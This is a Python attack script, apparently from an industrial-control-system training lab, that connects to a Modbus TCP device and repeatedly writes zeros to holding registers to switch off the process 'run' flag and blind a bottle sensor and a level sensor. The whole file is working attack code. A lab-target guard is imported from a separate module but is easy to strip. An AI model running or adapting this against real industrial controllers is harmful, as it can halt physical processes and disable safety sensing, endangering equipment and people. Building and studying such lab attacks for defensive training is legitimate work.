#!/usr/bin/env python3
"""Attack: shutdown plus sensor blackout.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 1.0.0
"""

from __future__ import annotations

import argparse
import logging
import time
from typing import Final

from pymodbus.client import ModbusTcpClient

from lab_guard import LabTargetError, assert_lab_target


LOGGER: Final[logging.Logger] = logging.getLogger("attacks.attack_shutdown2")


def parse_args() -> argparse.Namespace:
    """Parse CLI arguments."""
    parser = argparse.ArgumentParser(description="Shutdown + sensor blackout attack")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=15020)
    parser.add_argument("--duration", type=float, default=20.0)
    return parser.parse_args()


def main() -> int:
    """Entrypoint."""
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")
    args = parse_args()
    try:
        assert_lab_target(args.host)
    except LabTargetError as exc:
        LOGGER.error("%s", exc)
        return 2
    client = ModbusTcpClient(host=args.host, port=args.port)
    if not client.connect():
        LOGGER.error("Unable to connect to %s:%s", args.host, args.port)
        return 1

    payload = {
        1: 0,  # run off
        3: 0,  # bottle sensor off
        4: 0,  # level sensor off
    }
    started_at = time.time()
    try:
        while time.time() - started_at < max(1.0, float(args.duration)):
            for hr, value in payload.items():
                response = client.write_register(address=hr - 1, value=value, device_id=1)
                if response.isError():
                    LOGGER.error("Write failed HR[%04d]", hr)
            time.sleep(0.2)
        LOGGER.info("Attack finished")
    finally:
        client.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
